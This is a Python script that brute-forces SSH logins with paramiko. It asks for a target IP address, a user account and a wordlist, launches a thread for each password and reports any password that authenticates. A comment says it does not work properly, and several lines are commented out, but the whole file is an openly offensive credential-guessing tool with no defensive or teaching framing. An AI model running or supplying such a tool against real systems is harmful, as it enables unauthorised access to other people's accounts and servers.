#!/usr/bin/env python3

import os
import sys
import paramiko
import threading
import time

## The script is not working property because we have some issue with paramiko
def connect(user,password,host):
  ssh = paramiko.SSHClient()
  ssh.load_system_host_keys()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(host,username=user, password=password)
  except ConnectionResetError as err:
    #print('[!!] TCP Reset: {}'.format(err))
    pass
  except OSError as err:
    #print("OS error: {0}".format(err))
    pass
  except paramiko.ssh_exception.SSHException as err:
    #print('[!!] Reseted by the Host: {}'.format(err))
    pass
  except paramiko.ssh_exception.AuthenticationException:
    print('[-] Wrong Password: {}'.format(password).strip())
  else:
    print('[+] Password Found: {}'.format(password).strip())
    sys.exit(0)

  ssh.close()


def main():
  host = input("Enter IP Address of Target to BruteForce: ")
  user = input("Enter User Account You Want to BruteForce: ")
  wordlist = input("Enter the Path to the Wordlist You Want to Use: ")

  if not os.path.isfile(wordlist):
    print('[-] The file {} does not Exist'.format(wordlist))
    sys.exit(1)
  elif not os.access(wordlist, os.R_OK):
    print('[-] Access Denied for the file: {}'.format(wordlist))
    sys.exit(1)

  ## Calling the function
#  connect(user,host,wordlist)

  with open(wordlist) as file:
    for word in file.readlines():
      password = word.strip()
#      print("password: [{}]".format(password))
#      try:
      t = threading.Thread(target=connect,args=(user,password,host),daemon=True)
#      t.daemon = True
      t.start()
#        connect(user,password,host)
#        print('[+] Password Found: {}'.format(password).strip())
#      except:
#        print("Unexpected error:", sys.exc_info()[0])
#        raise
#        pass
#        print('[-] Wrong Password: {}'.format(password).strip())

main()
